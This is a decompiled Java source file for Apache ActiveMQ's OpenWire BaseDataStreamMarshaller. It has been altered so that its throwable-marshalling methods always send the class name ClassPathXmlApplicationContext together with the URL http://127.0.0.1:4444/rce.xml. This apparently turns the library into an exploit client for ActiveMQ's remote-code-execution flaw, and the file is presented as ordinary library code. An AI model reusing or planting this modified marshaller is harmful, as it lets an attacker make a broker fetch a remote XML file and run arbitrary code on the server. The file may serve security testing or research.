//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.apache.activemq.openwire.v12;

import java.io.DataInput;
import java.io.DataOutput;
import java.io.IOException;
import java.lang.reflect.Constructor;
import org.apache.activemq.command.DataStructure;
import org.apache.activemq.openwire.BooleanStream;
import org.apache.activemq.openwire.DataStreamMarshaller;
import org.apache.activemq.openwire.OpenWireFormat;
import org.apache.activemq.util.ByteSequence;

public abstract class BaseDataStreamMarshaller implements DataStreamMarshaller {
    public static final Constructor STACK_TRACE_ELEMENT_CONSTRUCTOR;

    public BaseDataStreamMarshaller() {
    }

    public abstract byte getDataStructureType();

    public abstract DataStructure createObject();

    public int tightMarshal1(OpenWireFormat wireFormat, Object o, BooleanStream bs) throws IOException {
        return 0;
    }

    public void tightMarshal2(OpenWireFormat wireFormat, Object o, DataOutput dataOut, BooleanStream bs) throws IOException {
    }

    public void tightUnmarshal(OpenWireFormat wireFormat, Object o, DataInput dataIn, BooleanStream bs) throws IOException {
    }

    public int tightMarshalLong1(OpenWireFormat wireFormat, long o, BooleanStream bs) throws IOException {
        if (o == 0L) {
            bs.writeBoolean(false);
            bs.writeBoolean(false);
            return 0;
        } else if ((o & -65536L) == 0L) {
            bs.writeBoolean(false);
            bs.writeBoolean(true);
            return 2;
        } else if ((o & -4294967296L) == 0L) {
            bs.writeBoolean(true);
            bs.writeBoolean(false);
            return 4;
        } else {
            bs.writeBoolean(true);
            bs.writeBoolean(true);
            return 8;
        }
    }

    public void tightMarshalLong2(OpenWireFormat wireFormat, long o, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            if (bs.readBoolean()) {
                dataOut.writeLong(o);
            } else {
                dataOut.writeInt((int)o);
            }
        } else if (bs.readBoolean()) {
            dataOut.writeShort((int)o);
        }

    }

    public long tightUnmarshalLong(OpenWireFormat wireFormat, DataInput dataIn, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            return bs.readBoolean() ? dataIn.readLong() : this.toLong(dataIn.readInt());
        } else {
            return bs.readBoolean() ? this.toLong(dataIn.readShort()) : 0L;
        }
    }

    protected long toLong(short value) {
        long answer = (long)value;
        return answer & 65535L;
    }

    protected long toLong(int value) {
        long answer = (long)value;
        return answer & 4294967295L;
    }

    protected DataStructure tightUnmarsalNestedObject(OpenWireFormat wireFormat, DataInput dataIn, BooleanStream bs) throws IOException {
        return wireFormat.tightUnmarshalNestedObject(dataIn, bs);
    }

    protected int tightMarshalNestedObject1(OpenWireFormat wireFormat, DataStructure o, BooleanStream bs) throws IOException {
        return wireFormat.tightMarshalNestedObject1(o, bs);
    }

    protected void tightMarshalNestedObject2(OpenWireFormat wireFormat, DataStructure o, DataOutput dataOut, BooleanStream bs) throws IOException {
        wireFormat.tightMarshalNestedObject2(o, dataOut, bs);
    }

    protected DataStructure tightUnmarsalCachedObject(OpenWireFormat wireFormat, DataInput dataIn, BooleanStream bs) throws IOException {
        if (wireFormat.isCacheEnabled()) {
            short index;
            if (bs.readBoolean()) {
                index = dataIn.readShort();
                DataStructure object = wireFormat.tightUnmarshalNestedObject(dataIn, bs);
                wireFormat.setInUnmarshallCache(index, object);
                return object;
            } else {
                index = dataIn.readShort();
                return wireFormat.getFromUnmarshallCache(index);
            }
        } else {
            return wireFormat.tightUnmarshalNestedObject(dataIn, bs);
        }
    }

    protected int tightMarshalCachedObject1(OpenWireFormat wireFormat, DataStructure o, BooleanStream bs) throws IOException {
        if (wireFormat.isCacheEnabled()) {
            Short index = wireFormat.getMarshallCacheIndex(o);
            bs.writeBoolean(index == null);
            if (index == null) {
                int rc = wireFormat.tightMarshalNestedObject1(o, bs);
                wireFormat.addToMarshallCache(o);
                return 2 + rc;
            } else {
                return 2;
            }
        } else {
            return wireFormat.tightMarshalNestedObject1(o, bs);
        }
    }

    protected void tightMarshalCachedObject2(OpenWireFormat wireFormat, DataStructure o, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (wireFormat.isCacheEnabled()) {
            Short index = wireFormat.getMarshallCacheIndex(o);
            if (bs.readBoolean()) {
                dataOut.writeShort(index);
                wireFormat.tightMarshalNestedObject2(o, dataOut, bs);
            } else {
                dataOut.writeShort(index);
            }
        } else {
            wireFormat.tightMarshalNestedObject2(o, dataOut, bs);
        }

    }

    protected Throwable tightUnmarsalThrowable(OpenWireFormat wireFormat, DataInput dataIn, BooleanStream bs) throws IOException {
        if (!bs.readBoolean()) {
            return null;
        } else {
            String clazz = this.tightUnmarshalString(dataIn, bs);
            String message = this.tightUnmarshalString(dataIn, bs);
            Throwable o = this.createThrowable(clazz, message);
            if (wireFormat.isStackTraceEnabled()) {
                int i;
                if (STACK_TRACE_ELEMENT_CONSTRUCTOR == null) {
                    short size = dataIn.readShort();

                    for(i = 0; i < size; ++i) {
                        this.tightUnmarshalString(dataIn, bs);
                        this.tightUnmarshalString(dataIn, bs);
                        this.tightUnmarshalString(dataIn, bs);
                        dataIn.readInt();
                    }
                } else {
                    StackTraceElement[] ss = new StackTraceElement[dataIn.readShort()];

                    for(i = 0; i < ss.length; ++i) {
                        try {
                            ss[i] = (StackTraceElement)STACK_TRACE_ELEMENT_CONSTRUCTOR.newInstance(this.tightUnmarshalString(dataIn, bs), this.tightUnmarshalString(dataIn, bs), this.tightUnmarshalString(dataIn, bs), dataIn.readInt());
                        } catch (IOException var10) {
                            throw var10;
                        } catch (Throwable var11) {
                        }
                    }

                    o.setStackTrace(ss);
                }

                o.initCause(this.tightUnmarsalThrowable(wireFormat, dataIn, bs));
            }

            return o;
        }
    }

    private Throwable createThrowable(String className, String message) {
        try {
            Class clazz = Class.forName(className, false, BaseDataStreamMarshaller.class.getClassLoader());
            Constructor constructor = clazz.getConstructor(String.class);
            return (Throwable)constructor.newInstance(message);
        } catch (Throwable var5) {
            return new Throwable(className + ": " + message);
        }
    }

    protected int tightMarshalThrowable1(OpenWireFormat wireFormat, Object o, BooleanStream bs) throws IOException {
        if (o == null) {
            bs.writeBoolean(false);
            return 0;
        } else {
            int rc = 0;
            bs.writeBoolean(true);
            rc += this.tightMarshalString1("org.springframework.context.support.ClassPathXmlApplicationContext", bs);
            rc += this.tightMarshalString1("http://127.0.0.1:4444/rce.xml", bs);
            if (wireFormat.isStackTraceEnabled()) {
                rc += 2;
                StackTraceElement[] stackTrace = (StackTraceElement[]) o;

                for(int i = 0; i < stackTrace.length; ++i) {
                    StackTraceElement element = stackTrace[i];
                    rc += this.tightMarshalString1(element.getClassName(), bs);
                    rc += this.tightMarshalString1(element.getMethodName(), bs);
                    rc += this.tightMarshalString1(element.getFileName(), bs);
                    rc += 4;
                }

                rc += this.tightMarshalThrowable1(wireFormat, o, bs);
            }

            return rc;
        }
    }

    protected void tightMarshalThrowable2(OpenWireFormat wireFormat, Object o, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            this.tightMarshalString2("org.springframework.context.support.ClassPathXmlApplicationContext", dataOut, bs);
            this.tightMarshalString2("http://127.0.0.1:4444/rce.xml", dataOut, bs);
            if (wireFormat.isStackTraceEnabled()) {
                StackTraceElement[] stackTrace = (StackTraceElement[]) o;
                dataOut.writeShort(stackTrace.length);

                for(int i = 0; i < stackTrace.length; ++i) {
                    StackTraceElement element = stackTrace[i];
                    this.tightMarshalString2(element.getClassName(), dataOut, bs);
                    this.tightMarshalString2(element.getMethodName(), dataOut, bs);
                    this.tightMarshalString2(element.getFileName(), dataOut, bs);
                    dataOut.writeInt(element.getLineNumber());
                }

                this.tightMarshalThrowable2(wireFormat, o, dataOut, bs);
            }
        }

    }

    protected String tightUnmarshalString(DataInput dataIn, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            if (bs.readBoolean()) {
                int size = dataIn.readShort();
                byte[] data = new byte[size];
                dataIn.readFully(data);
                return new String(data, 0);
            } else {
                return dataIn.readUTF();
            }
        } else {
            return null;
        }
    }

    protected int tightMarshalString1(String value, BooleanStream bs) throws IOException {
        bs.writeBoolean(value != null);
        if (value == null) {
            return 0;
        } else {
            int strlen = value.length();
            int utflen = 0;
            char[] charr = new char[strlen];
            boolean isOnlyAscii = true;
            value.getChars(0, strlen, charr, 0);

            for(int i = 0; i < strlen; ++i) {
                int c = charr[i];
                if (c >= 1 && c <= 127) {
                    ++utflen;
                } else if (c > 2047) {
                    utflen += 3;
                    isOnlyAscii = false;
                } else {
                    isOnlyAscii = false;
                    utflen += 2;
                }
            }

            if (utflen >= 32767) {
                throw new IOException("Encountered a String value that is too long to encode.");
            } else {
                bs.writeBoolean(isOnlyAscii);
                return utflen + 2;
            }
        }
    }

    protected void tightMarshalString2(String value, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            if (bs.readBoolean()) {
                dataOut.writeShort(value.length());
                dataOut.writeBytes(value);
            } else {
                dataOut.writeUTF(value);
            }
        }

    }

    protected int tightMarshalObjectArray1(OpenWireFormat wireFormat, DataStructure[] objects, BooleanStream bs) throws IOException {
        if (objects == null) {
            bs.writeBoolean(false);
            return 0;
        } else {
            int rc = 0;
            bs.writeBoolean(true);
            rc += 2;

            for(int i = 0; i < objects.length; ++i) {
                rc += this.tightMarshalNestedObject1(wireFormat, objects[i], bs);
            }

            return rc;
        }
    }

    protected void tightMarshalObjectArray2(OpenWireFormat wireFormat, DataStructure[] objects, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            dataOut.writeShort(objects.length);

            for(int i = 0; i < objects.length; ++i) {
                this.tightMarshalNestedObject2(wireFormat, objects[i], dataOut, bs);
            }
        }

    }

    protected int tightMarshalConstByteArray1(byte[] data, BooleanStream bs, int i) throws IOException {
        return i;
    }

    protected void tightMarshalConstByteArray2(byte[] data, DataOutput dataOut, BooleanStream bs, int i) throws IOException {
        dataOut.write(data, 0, i);
    }

    protected byte[] tightUnmarshalConstByteArray(DataInput dataIn, BooleanStream bs, int i) throws IOException {
        byte[] data = new byte[i];
        dataIn.readFully(data);
        return data;
    }

    protected int tightMarshalByteArray1(byte[] data, BooleanStream bs) throws IOException {
        bs.writeBoolean(data != null);
        return data != null ? data.length + 4 : 0;
    }

    protected void tightMarshalByteArray2(byte[] data, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            dataOut.writeInt(data.length);
            dataOut.write(data);
        }

    }

    protected byte[] tightUnmarshalByteArray(DataInput dataIn, BooleanStream bs) throws IOException {
        byte[] rc = null;
        if (bs.readBoolean()) {
            int size = dataIn.readInt();
            rc = new byte[size];
            dataIn.readFully(rc);
        }

        return rc;
    }

    protected int tightMarshalByteSequence1(ByteSequence data, BooleanStream bs) throws IOException {
        bs.writeBoolean(data != null);
        return data != null ? data.getLength() + 4 : 0;
    }

    protected void tightMarshalByteSequence2(ByteSequence data, DataOutput dataOut, BooleanStream bs) throws IOException {
        if (bs.readBoolean()) {
            dataOut.writeInt(data.getLength());
            dataOut.write(data.getData(), data.getOffset(), data.getLength());
        }

    }

    protected ByteSequence tightUnmarshalByteSequence(DataInput dataIn, BooleanStream bs) throws IOException {
        ByteSequence rc = null;
        if (bs.readBoolean()) {
            int size = dataIn.readInt();
            byte[] t = new byte[size];
            dataIn.readFully(t);
            return new ByteSequence(t, 0, size);
        } else {
            return (ByteSequence)rc;
        }
    }

    public void looseMarshal(OpenWireFormat wireFormat, Object o, DataOutput dataOut) throws IOException {
    }

    public void looseUnmarshal(OpenWireFormat wireFormat, Object o, DataInput dataIn) throws IOException {
    }

    public void looseMarshalLong(OpenWireFormat wireFormat, long o, DataOutput dataOut) throws IOException {
        dataOut.writeLong(o);
    }

    public long looseUnmarshalLong(OpenWireFormat wireFormat, DataInput dataIn) throws IOException {
        return dataIn.readLong();
    }

    protected DataStructure looseUnmarsalNestedObject(OpenWireFormat wireFormat, DataInput dataIn) throws IOException {
        return wireFormat.looseUnmarshalNestedObject(dataIn);
    }

    protected void looseMarshalNestedObject(OpenWireFormat wireFormat, DataStructure o, DataOutput dataOut) throws IOException {
        wireFormat.looseMarshalNestedObject(o, dataOut);
    }

    protected DataStructure looseUnmarsalCachedObject(OpenWireFormat wireFormat, DataInput dataIn) throws IOException {
        if (wireFormat.isCacheEnabled()) {
            short index;
            if (dataIn.readBoolean()) {
                index = dataIn.readShort();
                DataStructure object = wireFormat.looseUnmarshalNestedObject(dataIn);
                wireFormat.setInUnmarshallCache(index, object);
                return object;
            } else {
                index = dataIn.readShort();
                return wireFormat.getFromUnmarshallCache(index);
            }
        } else {
            return wireFormat.looseUnmarshalNestedObject(dataIn);
        }
    }

    protected void looseMarshalCachedObject(OpenWireFormat wireFormat, DataStructure o, DataOutput dataOut) throws IOException {
        if (wireFormat.isCacheEnabled()) {
            Short index = wireFormat.getMarshallCacheIndex(o);
            dataOut.writeBoolean(index == null);
            if (index == null) {
                index = wireFormat.addToMarshallCache(o);
                dataOut.writeShort(index);
                wireFormat.looseMarshalNestedObject(o, dataOut);
            } else {
                dataOut.writeShort(index);
            }
        } else {
            wireFormat.looseMarshalNestedObject(o, dataOut);
        }

    }

    protected Throwable looseUnmarsalThrowable(OpenWireFormat wireFormat, DataInput dataIn) throws IOException {
        if (!dataIn.readBoolean()) {
            return null;
        } else {
            String clazz = this.looseUnmarshalString(dataIn);
            String message = this.looseUnmarshalString(dataIn);
            Throwable o = this.createThrowable(clazz, message);
            if (wireFormat.isStackTraceEnabled()) {
                int i;
                if (STACK_TRACE_ELEMENT_CONSTRUCTOR == null) {
                    short size = dataIn.readShort();

                    for(i = 0; i < size; ++i) {
                        this.looseUnmarshalString(dataIn);
                        this.looseUnmarshalString(dataIn);
                        this.looseUnmarshalString(dataIn);
                        dataIn.readInt();
                    }
                } else {
                    StackTraceElement[] ss = new StackTraceElement[dataIn.readShort()];

                    for(i = 0; i < ss.length; ++i) {
                        try {
                            ss[i] = (StackTraceElement)STACK_TRACE_ELEMENT_CONSTRUCTOR.newInstance(this.looseUnmarshalString(dataIn), this.looseUnmarshalString(dataIn), this.looseUnmarshalString(dataIn), dataIn.readInt());
                        } catch (IOException var9) {
                            throw var9;
                        } catch (Throwable var10) {
                        }
                    }

                    o.setStackTrace(ss);
                }

                o.initCause(this.looseUnmarsalThrowable(wireFormat, dataIn));
            }

            return o;
        }
    }

    protected void looseMarshalThrowable(OpenWireFormat wireFormat, Object o, DataOutput dataOut) throws IOException {
        dataOut.writeBoolean(o != null);
        if (o != null) {
            this.looseMarshalString("org.springframework.context.support.ClassPathXmlApplicationContext", dataOut);
            this.looseMarshalString("http://127.0.0.1:4444/rce.xml", dataOut);
            if (wireFormat.isStackTraceEnabled()) {
                StackTraceElement[] stackTrace = (StackTraceElement[]) o;
                dataOut.writeShort(stackTrace.length);

                for(int i = 0; i < stackTrace.length; ++i) {
                    StackTraceElement element = stackTrace[i];
                    this.looseMarshalString(element.getClassName(), dataOut);
                    this.looseMarshalString(element.getMethodName(), dataOut);
                    this.looseMarshalString(element.getFileName(), dataOut);
                    dataOut.writeInt(element.getLineNumber());
                }

                this.looseMarshalThrowable(wireFormat, o, dataOut);
            }
        }

    }

    protected String looseUnmarshalString(DataInput dataIn) throws IOException {
        return dataIn.readBoolean() ? dataIn.readUTF() : null;
    }

    protected void looseMarshalString(String value, DataOutput dataOut) throws IOException {
        dataOut.writeBoolean(value != null);
        if (value != null) {
            dataOut.writeUTF(value);
        }

    }

    protected void looseMarshalObjectArray(OpenWireFormat wireFormat, DataStructure[] objects, DataOutput dataOut) throws IOException {
        dataOut.writeBoolean(objects != null);
        if (objects != null) {
            dataOut.writeShort(objects.length);

            for(int i = 0; i < objects.length; ++i) {
                this.looseMarshalNestedObject(wireFormat, objects[i], dataOut);
            }
        }

    }

    protected void looseMarshalConstByteArray(OpenWireFormat wireFormat, byte[] data, DataOutput dataOut, int i) throws IOException {
        dataOut.write(data, 0, i);
    }

    protected byte[] looseUnmarshalConstByteArray(DataInput dataIn, int i) throws IOException {
        byte[] data = new byte[i];
        dataIn.readFully(data);
        return data;
    }

    protected void looseMarshalByteArray(OpenWireFormat wireFormat, byte[] data, DataOutput dataOut) throws IOException {
        dataOut.writeBoolean(data != null);
        if (data != null) {
            dataOut.writeInt(data.length);
            dataOut.write(data);
        }

    }

    protected byte[] looseUnmarshalByteArray(DataInput dataIn) throws IOException {
        byte[] rc = null;
        if (dataIn.readBoolean()) {
            int size = dataIn.readInt();
            rc = new byte[size];
            dataIn.readFully(rc);
        }

        return rc;
    }

    protected void looseMarshalByteSequence(OpenWireFormat wireFormat, ByteSequence data, DataOutput dataOut) throws IOException {
        dataOut.writeBoolean(data != null);
        if (data != null) {
            dataOut.writeInt(data.getLength());
            dataOut.write(data.getData(), data.getOffset(), data.getLength());
        }

    }

    protected ByteSequence looseUnmarshalByteSequence(DataInput dataIn) throws IOException {
        ByteSequence rc = null;
        if (dataIn.readBoolean()) {
            int size = dataIn.readInt();
            byte[] t = new byte[size];
            dataIn.readFully(t);
            rc = new ByteSequence(t, 0, size);
        }

        return rc;
    }

    static {
        Constructor constructor = null;

        try {
            constructor = StackTraceElement.class.getConstructor(String.class, String.class, String.class, Integer.TYPE);
        } catch (Throwable var2) {
        }

        STACK_TRACE_ELEMENT_CONSTRUCTOR = constructor;
    }
}
